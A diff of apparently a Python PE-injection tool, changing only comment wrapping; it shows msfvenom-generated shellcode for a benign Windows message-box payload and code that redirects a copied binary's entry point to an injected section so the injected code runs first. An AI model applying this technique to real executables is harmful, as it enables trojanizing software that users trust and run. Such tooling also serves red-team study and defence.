@@ -6,8 +6,8 @@ import utilities
 def msgbox():
     # for this example we are using the message box payload
     # msfvenom -a x86 --platform windows -p windows/messagebox \
-    # TEXT="Test, Test, I'm in your code :)" ICON=INFORMATION EXITFUNC=process \
-    # TITLE="Testing" -f python
+    # TEXT="Test, Test, I'm in your code :)" ICON=INFORMATION \
+    # EXITFUNC=process TITLE="Testing" -f python
 
     messagebox = bytes(b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9"
                        b"\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08"
@@ -92,8 +92,8 @@ def insert_payload(path, payload, *args, **kwargs):
     path = utilities.make_duplicate(path, payload)
     pe = pefile.PE(path)
 
-    # We will first change the binaries entry point to be the newly injected section
-    # this will run our injected code first
+    # We will first change the binaries entry point to be the newly injected
+    # section this will run our injected code first
     if VERBOSE:
         print(f"Modifying Entry Point\n")
     pe.OPTIONAL_HEADER.AddressOfEntryPoint = pe.sections[-1].VirtualAddress
